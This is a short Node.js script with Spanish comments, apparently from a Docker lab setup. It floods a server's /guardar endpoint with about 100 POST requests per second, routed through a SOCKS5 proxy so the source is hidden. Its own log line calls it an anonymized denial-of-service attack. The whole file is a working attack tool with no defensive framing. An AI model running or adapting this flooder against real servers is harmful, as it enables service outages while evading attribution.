const http = require('http');
const { SocksProxyAgent } = require('socks-proxy-agent');

// Configuración del Proxy SOCKS5 (la IP .10 que definimos en Docker)
const proxy = 'socks5://172.20.0.10:1080';
const agent = new SocksProxyAgent(proxy);

const opciones = {
  hostname: '172.20.0.2', // IP del Servidor
  port: 3000,
  path: '/guardar',
  method: 'POST',
  agent: agent, // <--- Aquí le decimos que use el Proxy
  headers: { 'Content-Type': 'application/json' }
};

console.log("--- INICIANDO ATAQUE DOS ANONIMIZADO (VIA PROXY) ---");

function inundar() {
  const req = http.request(opciones, (res) => {
    res.on('data', () => {});
  });

  req.on('error', (e) => {
    console.log("Error en la conexión: " + e.message);
  });

  req.write(JSON.stringify({ name: "ANON_BOT_" + Date.now() }));
  req.end();
}

// 100 peticiones por segundo
setInterval(inundar, 10);